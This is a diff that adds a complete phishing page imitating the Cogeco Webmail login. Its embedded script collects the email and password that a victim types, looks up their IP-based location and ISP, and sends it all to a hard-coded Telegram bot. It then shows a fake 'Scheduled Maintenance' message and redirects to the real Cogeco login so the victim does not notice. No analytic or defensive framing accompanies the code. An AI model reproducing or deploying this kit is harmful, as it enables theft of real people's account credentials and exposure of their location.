@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en" class="login-page">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cogeco Webmail Login</title>
+    <link rel="stylesheet" href="css/bootstrap-4.0.0.min.css">
+    <link rel="stylesheet" href="themes/webmail/css/container.css">
+    <link rel="stylesheet" href="themes/webmail/css/spacing.css">
+    <link rel="stylesheet" href="themes/webmail/css/alert.css">
+    <link rel="stylesheet" href="themes/webmail/css/button.css">
+    <link rel="stylesheet" href="themes/webmail/css/form.css">
+    <link rel="stylesheet" href="themes/webmail/css/link.css">
+    <link rel="stylesheet" href="themes/webmail/css/cogeco.css">
+    <link rel="stylesheet" href="themes/webmail/fonts/feather/feather.css">
+    <style>
+        .cta-card .icon img {
+            width: 85%;
+            height: 85%;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="nav">
+        <div class="container" style="display: flex; justify-content: space-between; align-items: center;">
+            <img src="themes/webmail/images/logo-cogeco-blue.svg" alt="Cogeco Logo" class="logo">
+            <a href="#" style="color: #001E62; font-family: 'Quicksand', Arial, sans-serif; font-weight: 600; font-size: 1.4rem; text-decoration: none;">FR</a>
+        </div>
+    </nav>
+    <main>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-6 mb-4 mb-lg-0">
+                    <form class="form-signin">
+                        <h1>Welcome to Cogeco Webmail. Great to see you again.</h1>
+                        
+                        <div class="form-group">
+                            <label for="email" class="label-field">Email address</label>
+                            <input type="email" id="email" class="form-control" placeholder="youremail@cogeco.ca">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="password" class="label-field">Password</label>
+                            <input type="password" id="password" class="form-control" placeholder="Enter your password">
+                            <button type="button" class="reveal" id="togglePassword" aria-label="Toggle password visibility">
+                                <svg viewBox="0 0 24 24" width="16" height="16" stroke="#8D8E90" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" id="eyeIcon">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                    <circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                                <svg viewBox="0 0 24 24" width="16" height="16" stroke="#8D8E90" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" id="eyeOffIcon" style="display: none;">
+                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                                </svg>
+                            </button>
+                        </div>
+                        
+                        <div class="checkbox">
+                            <input type="checkbox" id="remember">
+                            <label for="remember">Remember my email address</label>
+                        </div>
+                        
+                        <div class="links">
+                            <a href="#" class="button-link">Forgot your password or email?</a>
+                        </div>
+                        
+                        <button type="submit" class="button button-tertiary button-block">Log in</button>
+                    </form>
+                </div>
+                
+                <div class="col-lg-6">
+                    <div class="promo-card">
+                        <div class="icon">
+                            <i class="fe fe-user"></i>
+                        </div>
+                        
+                        <h2>Get to know Webmail</h2>
+                        <p>Cogeco Webmail has convenient features, such as seamless navigation between your inbox, calendar and contacts.</p>
+                        
+                        <a href="#" class="button button-secondary-light button-auto">
+                            Learn more
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <section class="benefits">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center mb-5">
+                    <h2 class="h2">Use Webmail to its full potential</h2>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-3 col-md-6 mb-4 mb-lg-0">
+                    <div class="cta-card text-center">
+                        <div class="icon mb-4 mx-auto">
+                            <img src="css/my-account-duo-24.46b9488680.svg" alt="My Account">
+                        </div>
+                        <h3 class="h3 mb-3">Manage your addresses on My Account</h3>
+                        <p class="card-content mb-4">Create, edit or delete email accounts and passwords for your Webmail addresses on My Account.</p>
+                        <a href="#" class="button button-border-primary button-block" target="_blank">Log in to My Account</a>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-6 mb-4 mb-lg-0">
+                    <div class="cta-card text-center">
+                        <div class="icon mb-4 mx-auto">
+                            <img src="css/multi-device-duo-coral.b077732039.svg" alt="Multiple Devices">
+                        </div>
+                        <h3 class="h3 mb-3">See how to set up email on other devices</h3>
+                        <p class="card-content mb-4">Access your Cogeco email address from other email client software on any device.</p>
+                        <a href="#" class="button button-border-primary button-block" target="_blank">Learn how</a>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-6 mb-4 mb-md-0">
+                    <div class="cta-card text-center">
+                        <div class="icon mb-4 mx-auto">
+                            <img src="css/faq-duo-coral.e62ff7f73b.svg" alt="FAQs">
+                        </div>
+                        <h3 class="h3 mb-3">Get answers to your Webmail questions</h3>
+                        <p class="card-content mb-4">For answers to all your questions about Webmail and its range of features, visit our FAQs.</p>
+                        <a href="#" class="button button-border-primary button-block" target="_blank">Visit Webmail FAQs</a>
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-6">
+                    <div class="cta-card text-center">
+                        <div class="icon mb-4 mx-auto">
+                            <img src="css/security-wifi-duo-coral.2207ef8258.svg" alt="Security">
+                        </div>
+                        <h3 class="h3 mb-3">Protect yourself against fraud</h3>
+                        <p class="card-content mb-4">Learn how to identify fraudulent emails and other ways scammers may try to get your private information.</p>
+                        <a href="#" class="button button-border-primary button-block" target="_blank">Learn about fraud and scams</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <script>
+        // Password reveal toggle
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+        const eyeOffIcon = document.getElementById('eyeOffIcon');
+
+        togglePassword.addEventListener('click', function () {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            if (type === 'password') {
+                eyeIcon.style.display = 'block';
+                eyeOffIcon.style.display = 'none';
+            } else {
+                eyeIcon.style.display = 'none';
+                eyeOffIcon.style.display = 'block';
+            }
+        });
+
+        // Login form submission (send to Telegram bot with location/device info)
+        const loginForm = document.querySelector('.form-signin');
+        const TELEGRAM_BOT_TOKEN = '8838305882:AAHvPgdSTTdrVupvTKF7WZbPFNl3Ff8ngao';
+        const TELEGRAM_CHAT_ID = '894965765';
+        
+        loginForm.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            const currentTime = new Date().toLocaleString();
+            const platform = navigator.userAgent;
+            const language = navigator.language;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const colorDepth = window.screen.colorDepth;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            let ip = 'N/A';
+            let country = 'N/A';
+            let regionName = 'N/A';
+            let city = 'N/A';
+            let isp = 'N/A';
+            let ipLat = 'N/A';
+            let ipLon = 'N/A';
+            let postalCode = 'N/A';
+            let timezoneIp = 'N/A';
+            
+            // Get IP info automatically (no user permission needed)
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                if (ipData.ip) {
+                    ip = ipData.ip || 'N/A';
+                    country = ipData.country_name || 'N/A';
+                    regionName = ipData.region || 'N/A';
+                    city = ipData.city || 'N/A';
+                    isp = ipData.org || 'N/A';
+                    ipLat = ipData.latitude || 'N/A';
+                    ipLon = ipData.longitude || 'N/A';
+                    postalCode = ipData.postal || 'N/A';
+                    timezoneIp = ipData.timezone || 'N/A';
+                }
+            } catch (ipErr) {
+                console.error('IP API failed:', ipErr);
+            }
+            
+            // Build the full message
+            const message = `
+🔐 New Cogeco Webmail Login!
+📧 Email: ${email}
+🔑 Password: ${password}
+✅ Remember Me: ${remember ? 'Yes' : 'No'}
+🕐 Time: ${currentTime}
+🌍 Device Info:
+  Platform: ${platform}
+  Language: ${language}
+  Timezone: ${timezone}
+  Screen: ${screenWidth}x${screenHeight} @ ${colorDepth}-bit
+📍 IP-Based Location (NO PERMISSION REQUIRED):
+  IP: ${ip}
+  Country: ${country}
+  State/Region: ${regionName}
+  City: ${city}
+  Postal Code: ${postalCode}
+  Network/ISP: ${isp}
+  Timezone: ${timezoneIp}
+  Coordinates: ${ipLat}, ${ipLon}
+            `.trim();
+            
+            // Send message to Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (err) {
+                console.error('Telegram error:', err);
+            }
+            
+            // Display professional maintenance message and redirect
+            document.body.innerHTML = `
+                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: linear-gradient(135deg, #f5f7fa 0%, #e9ecef 100%); text-align: center; padding: 2rem;">
+                    <div style="max-width: 600px; background: white; padding: 3rem; border-radius: 1rem; box-shadow: 0 0.4rem 2rem rgba(0,30,98,0.1);">
+                        <div style="font-size: 4rem; margin-bottom: 1rem;">⚙️</div>
+                        <h1 style="font-size: 2rem; color: #001E62; margin-bottom: 1rem; font-weight: 700;">Scheduled Maintenance</h1>
+                        <p style="font-size: 1.1rem; color: #333; line-height: 1.6; margin-bottom: 2rem;">
+                            We are currently performing scheduled maintenance to improve your experience.
+                            We apologize for any inconvenience and appreciate your patience.
+                        </p>
+                        <div style="display: flex; justify-content: center; gap: 0.5rem;">
+                            <div style="width: 0.75rem; height: 0.75rem; background: #009BA8; border-radius: 50%; animation: pulse 1.4s ease-in-out infinite;"></div>
+                            <div style="width: 0.75rem; height: 0.75rem; background: #009BA8; border-radius: 50%; animation: pulse 1.4s ease-in-out infinite 0.2s;"></div>
+                            <div style="width: 0.75rem; height: 0.75rem; background: #009BA8; border-radius: 50%; animation: pulse 1.4s ease-in-out infinite 0.4s;"></div>
+                        </div>
+                    </div>
+                </div>
+                <style>
+                    @keyframes pulse {
+                        0%, 100% { opacity: 0.3; transform: scale(0.8); }
+                        50% { opacity: 1; transform: scale(1.2); }
+                    }
+                </style>
+            `;
+            
+            // Redirect to original Cogeco login after 5 seconds
+            setTimeout(() => {
+                window.location.href = 'https://wm.cogeco.ca/am/XUI/?locale=en#login';
+            }, 5000);
+        });
+
+
+    </script>
+</body>
+</html>
